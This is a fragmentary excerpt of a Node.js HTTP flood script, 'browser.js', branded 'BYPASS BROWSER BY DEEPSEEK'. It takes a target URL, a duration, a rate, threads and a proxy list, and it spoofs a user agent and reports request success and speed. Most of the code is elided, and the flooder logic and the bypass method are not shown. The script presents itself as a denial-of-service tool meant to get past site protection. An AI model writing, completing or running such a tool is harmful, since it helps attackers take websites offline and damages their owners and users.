...
if (process.argv.length < 6) {
    console.log("\x1b[31mUsage: node browser.js <target> <time> <rate> <threads> <solved> <proxy.txt>\x1b[0m");
    console.log("\x1b[33mExample: node browser.js https://example.com 60 5 4 6 proxy.txt\x1b[0m");
    process.exit(1);
}
...
const args = {
    ...
    proxyfile: parseInt(process.argv[7]) || 2
};
...
function runFlooder() {
    ...
    const userAgent = bypassInfo.userAgent || "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1";
...
function displayStats() {
    ...
    console.log("\x1b[36m              BYPASS BROWSER BY DEEPSEEK\x1b[0m");
    console.log("\x1b[36m═══════════════════════════════════════════════════════════\x1b[0m\n");
    
    console.log("\x1b[33mTarget:\x1b[0m", args.target);
    console.log("\x1b[33mDuration:\x1b[0m", `${elapsed}s / ${args.time}s`);
    console.log("\x1b[33mRemaining:\x1b[0m", `${remaining}s`);
    console.log("\x1b[33mSessions:\x1b[0m", `${global.bypassData ? global.bypassData.length : 0} / ${args.cookieCount}\n`);
    
    console.log("\x1b[33mConfiguration:\x1b[0m");
    console.log("  Rate    :", args.Rate, "req/interval");
    console.log("  Threads :", args.threads, "workers\n");
    
    console.log("\x1b[33mRequests:\x1b[0m");
    console.log("  Success :", (global.successRequests || 0).toLocaleString());
    console.log("  Failed  :", (global.failedRequests || 0).toLocaleString());
    console.log("  Total   :", (global.totalRequests || 0).toLocaleString());
    
    const speed = elapsed > 0 ? ((global.totalRequests || 0)/elapsed).toFixed(2) : 0;
    console.log("  Speed   :", speed, "req/s\n");
    ...
    if (remaining > 0) {
        ...
        console.log("\x1b[33mProgress:\x1b[0m", `[${progressBar}] ${Math.floor((elapsed/args.time)*100)}%`);
    }
}
...
if (cluster.isMaster) {
    ...
    (async () => {
        ...
        const statsInterval = setInterval(displayStats, 100);
